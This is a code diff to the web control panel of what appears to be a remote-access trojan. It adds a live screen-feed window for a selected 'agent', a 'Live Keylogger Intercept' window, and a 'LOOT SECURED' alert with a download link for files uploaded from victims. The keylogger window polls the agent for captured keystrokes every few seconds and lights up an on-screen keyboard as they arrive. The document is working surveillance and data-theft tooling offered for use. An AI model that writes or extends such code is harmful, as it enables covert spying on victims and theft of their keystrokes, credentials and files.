@@ -553,6 +553,19 @@
             text-transform: uppercase;
         }
         .island-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
+        /* Virtual Keyboard */
+        .vkb { display: flex; flex-direction: column; gap: 4px; padding: 10px; background: rgba(0,0,0,0.4); border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); }
+        .vkb-row { display: flex; gap: 4px; justify-content: center; }
+        .vkb-key { 
+            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 4px; 
+            min-width: 30px; height: 30px; display: flex; align-items: center; justify-content: center;
+            font-size: 0.75rem; color: #ccc; font-family: var(--font-mono); transition: 0.1s;
+            user-select: none; padding: 0 5px;
+        }
+        .vkb-key.active { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent-glow); transform: scale(0.95); }
+        .vkb-key.space { width: 150px; }
+        .vkb-key.enter, .vkb-key.shift { width: 60px; }
+        .vkb-key.backspace { width: 50px; }
     </style>
 </head>
 <body>
@@ -839,15 +852,6 @@
     </div>
 
     <!-- Screen Viewer -->
-    <div class="screen-overlay" id="screen-overlay">
-        <img id="screen-img" src="" alt="Live Screen" />
-        <div class="screen-bar">
-            <span id="screen-fps">0 FPS</span>
-            <span id="screen-res">--</span>
-            <button onclick="stopStream()"><i class="fa-solid fa-stop"></i> Stop Stream</button>
-            <button onclick="closeScreenViewer()" style="background:rgba(255,255,255,0.1)"><i class="fa-solid fa-xmark"></i> Close</button>
-        </div>
-    </div>
 
     <!-- ---------------------------------------------------
          JAVASCRIPT ENGINE
@@ -1192,20 +1196,15 @@
             });
 
             socket.on('stream_frame', data => {
-                const img = document.getElementById('screen-img');
-                const overlay = document.getElementById('screen-overlay');
-                
-                if(data.data) {
+                const img = document.getElementById('stream-img-target');
+                if(data.data && img) {
                     img.src = 'data:image/jpeg;base64,' + data.data;
                     _streamFrameCount++;
                     
-                    if(!overlay.classList.contains('active')) {
-                        overlay.classList.add('active');
-                        islandNotify('tv', 'LIVE STREAM', 'alert');
-                        
-                        if(_streamFpsTimer) clearInterval(_streamFpsTimer);
+                    if(!_streamFpsTimer) {
                         _streamFpsTimer = setInterval(() => {
-                            document.getElementById('screen-fps').textContent = _streamFrameCount + ' FPS';
+                            const fpsEl = document.getElementById('stream-fps-counter');
+                            if(fpsEl) fpsEl.textContent = _streamFrameCount + ' FPS';
                             _streamFrameCount = 0;
                         }, 1000);
                     }
@@ -1214,7 +1213,10 @@
 
             socket.on('upload_new', data => {
                 logTerminal(`File uploaded from agent: ${data.filename} (${data.size} bytes)`, 'warn');
-                islandNotify('cloud-arrow-up', `FILE: ${data.filename}`, 'alert', 4000);
+                islandNotify('cloud-arrow-up', `LOOT SECURED: ${data.original || data.filename}`, 'success', 10000, {
+                    text: 'DOWNLOAD ZIP/TXT',
+                    callback: () => { window.location = `/api/panel/download_loot?file=${data.filename}&token=${token}`; }
+                });
             });
         }
 
@@ -1255,17 +1257,6 @@
             });
         }
 
-        // --- 9. Screen Viewer ---
-        function stopStream() {
-            if(selectedClient) {
-                cmd('screen_stop');
-                islandNotify('stop', 'STREAM STOPPED', 'danger', 2000);
-            }
-        }
-        function closeScreenViewer() {
-            document.getElementById('screen-overlay').classList.remove('active');
-            if(_streamFpsTimer) { clearInterval(_streamFpsTimer); _streamFpsTimer = null; }
-        }
 
         // --- 10. Dynamic Island Reactive System ---
         let _islandTimer = null;
@@ -1466,7 +1457,10 @@ if (typeof original_cmd === 'undefined') {
         if(action === 'audio_start') { 
             if(typeof startAudioStream === 'function') startAudioStream(); 
         }
-        if(action === 'keylogger') {
+        if(action === 'screen_start') {
+            if(typeof startStream === 'function') startStream();
+        }
+        if(action === 'keylog_start') {
             if(typeof startKeylogger === 'function') startKeylogger();
         }
         execute(selectedClient, action);
@@ -1595,9 +1589,89 @@ function startAudioStream() {
     if(!audioDrawVisual) draw();
 }
 
+function startStream() {
+    const win = createDragWindow('stream-win', 'Live Screen Feed', 'fa-solid fa-desktop', 
+        '<div style="width:100%; height:100%; display:flex; flex-direction:column; position:relative;">' +
+        '<div style="position:absolute; top:10px; right:10px; background:rgba(0,0,0,0.7); padding:4px 10px; border-radius:12px; font-size:0.8rem;" id="stream-fps-counter">0 FPS</div>' +
+        '<img id="stream-img-target" style="width:100%; height:100%; object-fit:contain; background:#000; border-radius:8px;">' +
+        '</div>');
+    win.style.width = '800px';
+    win.style.height = '500px';
+}
+
 function startKeylogger() {
-    cmd('keylogger');
-    const win = createDragWindow('keylog-win', 'Live Keylogger Feed', 'fa-solid fa-keyboard', '<div id="keylog-feed" style="white-space: pre-wrap;">Awaiting keystrokes...</div>');
+    const kbHtml = `
+        <div style="margin-bottom:10px; color:var(--accent);">Live Keystroke Monitor (Polling Active)</div>
+        <div class="vkb">
+            <div class="vkb-row">
+                <div class="vkb-key" id="vk-Escape">ESC</div><div class="vkb-key" id="vk-F1">F1</div><div class="vkb-key" id="vk-F2">F2</div><div class="vkb-key" id="vk-F3">F3</div><div class="vkb-key" id="vk-F4">F4</div><div class="vkb-key" id="vk-F5">F5</div><div class="vkb-key" id="vk-F6">F6</div><div class="vkb-key" id="vk-F7">F7</div><div class="vkb-key" id="vk-F8">F8</div><div class="vkb-key" id="vk-F9">F9</div><div class="vkb-key" id="vk-F10">F10</div><div class="vkb-key" id="vk-F11">F11</div><div class="vkb-key" id="vk-F12">F12</div>
+            </div>
+            <div class="vkb-row">
+                <div class="vkb-key" id="vk-Oemtilde">~</div><div class="vkb-key" id="vk-D1">1</div><div class="vkb-key" id="vk-D2">2</div><div class="vkb-key" id="vk-D3">3</div><div class="vkb-key" id="vk-D4">4</div><div class="vkb-key" id="vk-D5">5</div><div class="vkb-key" id="vk-D6">6</div><div class="vkb-key" id="vk-D7">7</div><div class="vkb-key" id="vk-D8">8</div><div class="vkb-key" id="vk-D9">9</div><div class="vkb-key" id="vk-D0">0</div><div class="vkb-key" id="vk-OemMinus">-</div><div class="vkb-key" id="vk-OemPlus">=</div><div class="vkb-key backspace" id="vk-Back">BACK</div>
+            </div>
+            <div class="vkb-row">
+                <div class="vkb-key" id="vk-Tab">TAB</div><div class="vkb-key" id="vk-Q">Q</div><div class="vkb-key" id="vk-W">W</div><div class="vkb-key" id="vk-E">E</div><div class="vkb-key" id="vk-R">R</div><div class="vkb-key" id="vk-T">T</div><div class="vkb-key" id="vk-Y">Y</div><div class="vkb-key" id="vk-U">U</div><div class="vkb-key" id="vk-I">I</div><div class="vkb-key" id="vk-O">O</div><div class="vkb-key" id="vk-P">P</div><div class="vkb-key" id="vk-OemOpenBrackets">[</div><div class="vkb-key" id="vk-OemCloseBrackets">]</div><div class="vkb-key" id="vk-OemPipe">\\</div>
+            </div>
+            <div class="vkb-row">
+                <div class="vkb-key" id="vk-Capital">CAPS</div><div class="vkb-key" id="vk-A">A</div><div class="vkb-key" id="vk-S">S</div><div class="vkb-key" id="vk-D">D</div><div class="vkb-key" id="vk-F">F</div><div class="vkb-key" id="vk-G">G</div><div class="vkb-key" id="vk-H">H</div><div class="vkb-key" id="vk-J">J</div><div class="vkb-key" id="vk-K">K</div><div class="vkb-key" id="vk-L">L</div><div class="vkb-key" id="vk-OemSemicolon">;</div><div class="vkb-key" id="vk-OemQuotes">'</div><div class="vkb-key enter" id="vk-Return">ENT</div>
+            </div>
+            <div class="vkb-row">
+                <div class="vkb-key shift" id="vk-LShiftKey">SHFT</div><div class="vkb-key" id="vk-Z">Z</div><div class="vkb-key" id="vk-X">X</div><div class="vkb-key" id="vk-C">C</div><div class="vkb-key" id="vk-V">V</div><div class="vkb-key" id="vk-B">B</div><div class="vkb-key" id="vk-N">N</div><div class="vkb-key" id="vk-M">M</div><div class="vkb-key" id="vk-Oemcomma">,</div><div class="vkb-key" id="vk-OemPeriod">.</div><div class="vkb-key" id="vk-OemQuestion">/</div><div class="vkb-key shift" id="vk-RShiftKey">SHFT</div>
+            </div>
+            <div class="vkb-row">
+                <div class="vkb-key" id="vk-LControlKey">CTRL</div><div class="vkb-key" id="vk-LWin">WIN</div><div class="vkb-key" id="vk-LMenu">ALT</div><div class="vkb-key space" id="vk-Space">SPACE</div><div class="vkb-key" id="vk-RMenu">ALT</div><div class="vkb-key" id="vk-RWin">WIN</div><div class="vkb-key" id="vk-RControlKey">CTRL</div>
+            </div>
+        </div>
+        <div id="keylog-buffer" style="margin-top:15px; background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; min-height:80px; font-size:0.8rem; word-wrap:break-word;"></div>
+    `;
+
+    const win = createDragWindow('keylog-win', 'Live Keylogger Intercept', 'fa-solid fa-keyboard', kbHtml);
+    win.style.width = '700px';
+
+    // Start auto-dumping keylog from agent to light up the keyboard
+    let lastKeylogLen = 0;
+    const poller = setInterval(() => {
+        if(!document.getElementById('keylog-win')) {
+            clearInterval(poller);
+            return;
+        }
+        execute(selectedClient, 'keylog_dump');
+    }, 2500);
+
+    // Override handleResult to catch keylog_dump specifically for the keyboard
+    const prevHandler = window.handleResult || function(){};
+    window.handleResult = function(cid, tag, fullData) {
+        if(tag.toLowerCase().includes('keylog')) {
+            const buf = document.getElementById('keylog-buffer');
+            if(buf) {
+                buf.textContent = fullData;
+                // Animate keys that appear
+                const keys = fullData.match(/\[(.*?)\]/g) || [];
+                if(keys.length > lastKeylogLen) {
+                    const newKeys = keys.slice(lastKeylogLen);
+                    lastKeylogLen = keys.length;
+                    newKeys.forEach((k, i) => {
+                        setTimeout(() => {
+                            let kName = k.replace('[','').replace(']','');
+                            let btn = document.getElementById('vk-' + kName);
+                            if(!btn) {
+                                // Try mapping some generic ones
+                                if(kName.includes('Shift')) btn = document.getElementById('vk-LShiftKey');
+                                if(kName.includes('Control')) btn = document.getElementById('vk-LControlKey');
+                                if(kName.includes('Alt')) btn = document.getElementById('vk-LMenu');
+                            }
+                            if(btn) {
+                                btn.classList.add('active');
+                                setTimeout(() => btn.classList.remove('active'), 300);
+                            }
+                        }, i * 150); // cascading press effect
+                    });
+                }
+            }
+            return; // consume
+        }
+        prevHandler(cid, tag, fullData);
+    };
 }
 
 // Intercept specific Result updates to feed them to Drag Windows instead of universal modal
